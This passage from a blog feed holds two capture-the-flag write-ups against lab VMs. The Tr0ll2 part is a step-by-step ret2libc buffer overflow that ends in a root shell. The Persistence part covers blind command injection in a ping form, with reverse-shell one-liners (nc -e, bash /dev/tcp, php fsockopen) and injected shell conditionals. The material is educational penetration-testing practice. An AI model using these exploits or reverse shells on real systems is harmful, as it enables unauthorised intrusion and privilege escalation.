The system is going down for reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D&lt;/p&gt;

&lt;p&gt;The machine rebooted and I logged in again as &lt;code&gt;noob&lt;/code&gt;, changing directories to the &lt;code&gt;r00t&lt;/code&gt; binaries. I tried to run &lt;code&gt;strings&lt;/code&gt; on them, but it seems like the command was unavailable. No worries, next on the list was &lt;code&gt;od&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
[...]
0001214 __libc_start_main
0001236 GLIBC_2.0
0001320 R
0001453 Q
0001521 %
0001526 h
0001626 h
0001646 h(
0002066 t&amp;amp;
0002073 &#39;
0002305 i
0002620 Good job, stand by, executing root shell...
0002674 BUHAHAHA NOOB!
0002713 /sbin/reboot
0002733 ;0
0002750 L
0002760 p
0003025 zR
0003044
0003060 p
0003077 x
[...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this is the binary that simply rebooted the machine. What is weird though is that this &lt;code&gt;r00t&lt;/code&gt; binary was in &lt;code&gt;door1/&lt;/code&gt; prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the &lt;code&gt;r00t&lt;/code&gt; binaries were shuffled around again.&lt;/p&gt;

&lt;p&gt;This was only a minor annoyance and I had enough time to check out the binaries using &lt;code&gt;od&lt;/code&gt; to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.&lt;/p&gt;

&lt;h2 id=&#34;bof-bof-bof-your-boat&#34;&gt;bof bof bof your boat&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I copied the binary of interest to &lt;code&gt;/tmp&lt;/code&gt; so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.&lt;/p&gt;

&lt;p&gt;With the binary in &lt;code&gt;/tmp&lt;/code&gt;, &lt;code&gt;noob&lt;/code&gt; was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.&lt;/p&gt;

&lt;p&gt;To check the security applied to the binary at compile time, I copied it off using &lt;code&gt;xxd&lt;/code&gt; to my local machine and checked it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No security? EZ PEZE.&lt;/p&gt;

&lt;p&gt;Next, it was time to start fuzzing the binary and see if it has any interesting behavior:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;500 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)

noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include &lt;code&gt;gdb&lt;/code&gt;, making the exploit development process very easy.&lt;/p&gt;

&lt;h2 id=&#34;the-exploit&#34;&gt;the exploit&lt;/h2&gt;

&lt;p&gt;With all of the information gathered so far about this particularly interesting &lt;code&gt;r00t&lt;/code&gt; binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.&lt;/p&gt;

&lt;p&gt;First, we have to inspect the crash when we send those 500 A&amp;rsquo;s&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)
Starting program: /tmp/r00t $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) x/x $eip
0x41414141: Cannot access memory at address 0x41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see that we have cleanly overwritten EIP with our hex representation of A&amp;rsquo;s. We don&amp;rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit &lt;code&gt;pattern_create&lt;/code&gt; script, and then checking the offset using the &lt;code&gt;pattern_offset&lt;/code&gt; script.&lt;/p&gt;

&lt;p&gt;Lets generate the pattern.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we provide this pattern as input to crash the application and inspect the registers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&amp;quot;

Starting program: /tmp/r00t &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&amp;quot;

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we crashed at &lt;code&gt;0x6a413969&lt;/code&gt;. Lets check the offset of this in our buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
[*] Exact match at offset 268
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&amp;rsquo;s:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;BBBB&amp;quot;&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;BBBB&amp;quot;&#39;)

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) x/x $eip
0x42424242: Cannot access memory at address 0x42424242
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So with that done, we can deduce that we can cleanly override EIP at offset 268.&lt;/p&gt;

&lt;p&gt;The next part we need to get is the location of &lt;code&gt;system()&lt;/code&gt; from within libc. We can leak this address quite easily by inspecting the memory from a running application such as &lt;code&gt;r00t&lt;/code&gt; linked to it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) b *main   # here we break on the main function
Breakpoint 1 at 0x8048444: file bof.c, line 3.

(gdb) r         # here we run the application....
Starting program: /tmp/r00t

Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
3   bof.c: No such file or directory.

(gdb) p system  # and leak the locatin of system() in memory
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e6b060 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;system()&lt;/code&gt; lives at &lt;code&gt;0xb7e6b060&lt;/code&gt;. We are going to point EIP here and provide it a argument from a environment variable. I don&amp;rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of &lt;code&gt;exit()&lt;/code&gt; too and placing that as the ret address in the exploit. I just like to type JUNK ;)&lt;/p&gt;

&lt;p&gt;So far our exploit payload will look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;A * 268 + system() + JUNK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last thing we need is a argument for &lt;code&gt;system()&lt;/code&gt; on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as &lt;code&gt;/bin/sh&lt;/code&gt;. We can easily set an environment variable with this string, locate it in memory and use that.&lt;/p&gt;

&lt;p&gt;So lets create this string, which we will refer to as the EGG.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ export EGG=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG=/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we can use a small C program to tell us where this EGG is in memory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
#include &amp;lt;unistd.h&amp;gt;

int main(void)
{
  printf(&amp;quot;EGG address: 0x%lx\n&amp;quot;, getenv(&amp;quot;EGG&amp;quot;)+4);
  return 0;
}

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[...]

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So our egg lives at &lt;code&gt;0xbfffff04&lt;/code&gt;. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;With everything we need, we can deduce that our exploit payload will end up being something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;A * 268 + system() + JUNK + EGG
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &amp;lsquo;backwards&amp;rsquo; due to the little endian format of the CPU):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x04\xff\xff\xbf&amp;quot;&#39;)
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called &lt;code&gt;r00t&lt;/code&gt;, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# so just to recap, we check for the location of the EGG
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

# EGG is at 0xbfffff04, so in little endian format we have:
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x04\xff\xff\xbf&amp;quot;&#39;)
Segmentation fault

# A segfault, lets move it up 1 byte
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x05\xff\xff\xbf&amp;quot;&#39;)
sh: 1: =/bin/sh: not found
Segmentation fault

# another segfault, however we have a little diagnostics message now
# showing that we are not far off :)
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x06\xff\xff\xbf&amp;quot;&#39;)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;trollin-the-rootin&#34;&gt;trollin the rootin&lt;/h2&gt;

&lt;p&gt;So &lt;code&gt;0xbfffff06&lt;/code&gt; as a EGG location will give us shell in our testing! To finish off then, I have to find the correct &lt;code&gt;r00t&lt;/code&gt; binary in all of the &lt;code&gt;door{1,2,3}&lt;/code&gt; folders and attempt my exploit there:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x06\xff\xff\xbf&amp;quot;&#39;)
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the &lt;code&gt;PWD&lt;/code&gt; changing so drastically. To fix this, we simply rerun our &lt;code&gt;findegg&lt;/code&gt; program and compensate for the binary name. When completing this, I had a successful run as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\xe2\xfe\xff\xbf&amp;quot;&#39;)
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from &lt;code&gt;0xbffffeda&lt;/code&gt; all the way to &lt;code&gt;0xbffffee2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As I was now root, I may cat the &lt;code&gt;Proof.txt&lt;/code&gt; in &lt;code&gt;/root&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# cat /root/Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; for the fun VM and &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; for the hosting :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>From Persistence</title>
      <link>https://leonjza.github.io/blog/2014/09/18/from-persistence/</link>
      <pubDate>Thu, 18 Sep 2014 06:58:53 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/09/18/from-persistence/</guid>
      <description>

&lt;h2 id=&#34;persist-we-must&#34;&gt;persist we must!&lt;/h2&gt;

&lt;p&gt;Persistence! A new boot2root hosted &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;, authored by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;@superkojiman&lt;/a&gt; and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a &lt;a href=&#34;http://blog.vulnhub.com/2014/09/competition-persistence.html&#34;&gt;writeup competition&lt;/a&gt; launched on September the 7th, and ran up until October th 5th.&lt;/p&gt;

&lt;p&gt;This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &amp;ldquo;meh, next&amp;rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!&lt;/p&gt;

&lt;h2 id=&#34;lets-get-our-hands-dirty&#34;&gt;lets get our hands dirty&lt;/h2&gt;

&lt;p&gt;As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.&lt;/p&gt;

&lt;p&gt;My VM got the IP 192.168.56.104, and the first Nmap result was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0037s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.&lt;/p&gt;

&lt;p&gt;Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&amp;hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.&lt;/p&gt;

&lt;p&gt;By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried &lt;code&gt;index.html&lt;/code&gt;, and got the normal landing. When I requested &lt;code&gt;index.php&lt;/code&gt; though, things changed drastically:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -v 192.168.56.104/index.php
* About to connect() to 192.168.56.104 port 80 (#0)
*   Trying 192.168.56.104...
* connected
* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)
&amp;gt; GET /index.php HTTP/1.1
&amp;gt; User-Agent: curl/7.26.0
&amp;gt; Host: 192.168.56.104
&amp;gt; Accept: */*

* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
&amp;lt; HTTP/1.1 404 Not Found
&amp;lt; Server: nginx/1.4.7
&amp;lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
&amp;lt; Content-Type: text/html
&amp;lt; Transfer-Encoding: chunked
&amp;lt; Connection: keep-alive
&amp;lt; X-Powered-By: PHP/5.3.3

No input file specified.

* Connection #0 to host 192.168.56.104 left intact
* Closing connection #0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As can be seen in the output above, the header &lt;code&gt;X-Powered-By: PHP/5.3.3&lt;/code&gt; is now present, and the output &lt;code&gt;No input file specified.&lt;/code&gt;. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.&lt;/p&gt;

&lt;h2 id=&#34;finding-that-de-bugger&#34;&gt;finding that (de)bugger&lt;/h2&gt;

&lt;p&gt;With this information now gathered, it was time to pull out one of my favorite tools, &lt;code&gt;wfuzz&lt;/code&gt;! With &lt;code&gt;wfuzz&lt;/code&gt;, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.&lt;/p&gt;

&lt;p&gt;My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending &lt;em&gt;.php&lt;/em&gt; to my &lt;code&gt;FUZZ&lt;/code&gt; keyword:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.104/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

00434:  C=200     12 L        28 W      357 Ch    &amp;quot; - debug&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. &lt;code&gt;wfuzz&lt;/code&gt; is stupidly fast and finished the above in like 4 seconds. Browsing to &lt;a href=&#34;http://192.168.56.101/debug.php&#34;&gt;http://192.168.56.101/debug.php&lt;/a&gt; showed us a input field labeled &amp;ldquo;Ping address:&amp;rdquo; and a submit button&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/persistence_debug_php.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&amp;ldquo;Command injection?&amp;rdquo;, was the first thought here.&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection&#34;&gt;blind command injection&lt;/h2&gt;

&lt;p&gt;I started by entering a valid IP address that had &lt;code&gt;tcpdump&lt;/code&gt; listening to test if the script is actually running a ping like it says &amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
07:46:15.503023 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
07:46:15.503040 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
07:46:16.503729 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
07:46:16.503768 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
07:46:17.503180 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
07:46:17.503260 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
07:46:18.502811 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
07:46:18.502842 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; which it was. What is important to note here is that we have 4 echo requests.&lt;/p&gt;

&lt;p&gt;I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field &lt;code&gt;;exit 0;&lt;/code&gt; caused the HTTP request to complete almost instantly while no ping requests were observed on the &lt;code&gt;tcpdump&lt;/code&gt;. This had me certain that this field was vulnerable to a command injection vulnerability.&lt;/p&gt;

&lt;p&gt;This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.&lt;/p&gt;

&lt;p&gt;I tried the usual culprits: &lt;code&gt;nc &amp;lt;ip&amp;gt;  &amp;lt;port&amp;gt; -e /bin/bash&lt;/code&gt;; &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;; &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;&amp;lt;ip&amp;gt;&amp;quot;,&amp;lt;port&amp;gt;);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection-file-enumeration&#34;&gt;blind command injection - file enumeration&lt;/h2&gt;

&lt;p&gt;Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.&lt;/p&gt;

&lt;p&gt;I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash &lt;code&gt;if [ -f /file ]&lt;/code&gt; statement, with a single ping for success, and 2 pings for a failure. The string for the &lt;code&gt;debug.php&lt;/code&gt; input field looked something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Submitting the above input presented me with a single ping, confirming that &lt;code&gt;/bin/sh&lt;/code&gt; exists.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
08:15:53.557994 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
08:15:53.558011 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking for something like &lt;code&gt;/bin/sh2&lt;/code&gt; responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as &lt;code&gt;/bin/nc&lt;/code&gt;, I may end up with greater success of a shell!&lt;/p&gt;

&lt;p&gt;I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  &lt;code&gt;/usr/bin/python&lt;/code&gt; appeared to be available! I really like python so this had me really happy.&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection-port-scanner&#34;&gt;blind command injection - port scanner&lt;/h2&gt;

&lt;p&gt;I tested a few commands with &lt;code&gt;python -c&lt;/code&gt;, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.&lt;/p&gt;

